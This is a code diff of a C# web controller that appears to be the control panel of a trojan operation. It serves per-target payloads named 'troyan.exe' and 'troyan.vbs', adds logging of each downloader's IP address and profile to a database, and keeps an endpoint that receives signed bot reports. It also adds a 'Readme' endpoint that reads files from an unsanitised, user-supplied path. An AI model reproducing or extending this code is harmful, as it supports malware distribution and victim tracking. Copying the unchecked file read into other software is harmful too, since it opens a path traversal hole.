@@ -225,24 +225,6 @@ public class CpController : Controller
         return GetFile(_serverService.GetExe(server), "troyan.exe");
     }
     
-    [HttpGet("{server}/GetVbs")]
-    public IActionResult GetVbs(string server)
-    {
-        return GetFile(_serverService.GetVbs(server), "troyan.vbs");
-    }
-    
-    [HttpGet("{server}/GetLiteVbs")]
-    public IActionResult GetLiteVbs(string server)
-    {
-        return GetFile(_serverService.GetLiteVbs(server), "litetroyan.vbs");
-    }
-
-    [HttpGet("{server}/{random}/{target}/BuildExe")]
-    public IActionResult BuildExe(string server, string random, string target)
-    {
-        return GetFile(_serverService.GetExe(server), "troyan.exe");
-    }
-    
     protected async Task<IActionResult> GetFileFromString(string server, string file, string name, string random, string target)
     {
         try
@@ -266,16 +248,65 @@ public class CpController : Controller
         }
     }
     
-    [HttpGet("{server}/{random}/{target}/BuildVbs")]
-    public async Task<IActionResult> BuildVbs(string server, string random, string target)
+    [HttpGet("{server}/{profile}/{random}/{target}/GetVbs")]
+    public async Task<IActionResult> GetVbs(string server, string profile, string random, string target)
     {
+        var ipAddress = GetIp();
+        if (string.IsNullOrWhiteSpace(ipAddress))
+            return BadRequest("IP address not found.");
+        if (string.IsNullOrWhiteSpace(server))
+            return BadRequest("Server address not found.");
+        
+        await DnLog(server, profile, ipAddress);
+        
         return await GetFileFromString(server, "troyan.c.vbs", "fun.vbs", random, target);
     }
     
-    [HttpGet("{server}/{random}/{target}/BuildLiteVbs")]
-    public async Task<IActionResult> BuildLiteVbs(string server, string random, string target)
+    [HttpGet("{server}/{profile}/{random}/{target}/GetLightVbs")]
+    public async Task<IActionResult> GetLiteVbs(string server, string profile, string random, string target)
     {
+        var ipAddress = GetIp();
+        if (string.IsNullOrWhiteSpace(ipAddress))
+            return BadRequest("IP address not found.");
+        if (string.IsNullOrWhiteSpace(server))
+            return BadRequest("Server address not found.");
+
+        await DnLog(server, profile, ipAddress);
+        
         return await GetFileFromString(server, "litetroyan.c.vbs", "litefun.vbs", random, target);
+    }
+
+    protected async Task DnLog(string server, string profile, string ipAddress)
+    {
+        using (var connection = new SqlConnection(_connectionString))
+        {
+            await connection.OpenAsync();
+
+            using (var command = new SqlCommand("dbo.LogDn", connection))
+            {
+                command.CommandType = CommandType.StoredProcedure;
+
+                command.Parameters.AddWithValue("@server", server ?? (object)DBNull.Value);
+                command.Parameters.AddWithValue("@profile", profile ?? (object)DBNull.Value);
+                command.Parameters.AddWithValue("@ip", ipAddress);
+
+                await command.ExecuteNonQueryAsync();
+            }
+        }
+    }
+
+    [HttpGet("Readme")]
+    public IActionResult Readme([FromQuery] string chapter)
+    {
+        try
+        {
+            var content = System.IO.File.ReadAllText($"Readme\\{chapter}.txt");
+            return Ok(content);
+        }
+        catch (Exception e)
+        {
+            return Ok("Not found:" + chapter);
+        }
     }
     
     [HttpPost()]
@@ -462,30 +493,9 @@ public class CpController : Controller
         
         return IndexAdmin();
     }
-    
-    [HttpPost("{server}/upsert")]
-    [Consumes("application/json")]
-    [Produces("application/json")]
-    public async Task<IActionResult> UpsertBotLog(
-        string server,
-        [FromHeader(Name = "X-Signature")] string xSignature,
-        [FromBody] BotLogRequest request)
+
+    protected string GetIp()
     {
-        // Serialize the request object to JSON
-        var jsonOptions = new JsonSerializerOptions
-        {
-            DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
-            PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
-            WriteIndented = false // Ensure compact JSON
-        };
-
-        string jsonBody = JsonSerializer.Serialize(request, jsonOptions);
-
-        if (!ValidateHash(jsonBody, xSignature, SecretKey))
-        {
-            return Unauthorized("Invalid signature.");
-        }
-
         string ipAddress = "unknown";
         try
         {
@@ -505,15 +515,37 @@ public class CpController : Controller
                 : forwardedFor.Split(',').Select(s => s.Trim()).FirstOrDefault();
         }
 
-
+        return ipAddress;
+    }
+   
+    
+    [HttpPost("{server}/upsert")]
+    [Consumes("application/json")]
+    [Produces("application/json")]
+    public async Task<IActionResult> UpsertBotLog(
+        string server,
+        [FromHeader(Name = "X-Signature")] string xSignature,
+        [FromBody] BotLogRequest request)
+    {
+        var ipAddress = GetIp();
         if (string.IsNullOrWhiteSpace(ipAddress))
-        {
             return BadRequest("IP address not found.");
-        }
-
         if (string.IsNullOrWhiteSpace(server))
-        {
             return BadRequest("Server address not found.");
+        
+        // Serialize the request object to JSON
+        var jsonOptions = new JsonSerializerOptions
+        {
+            DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
+            PropertyNamingPolicy = JsonNamingPolicy.CamelCase,
+            WriteIndented = false // Ensure compact JSON
+        };
+
+        string jsonBody = JsonSerializer.Serialize(request, jsonOptions);
+
+        if (!ValidateHash(jsonBody, xSignature, SecretKey))
+        {
+            return Unauthorized("Invalid signature.");
         }
 
         try
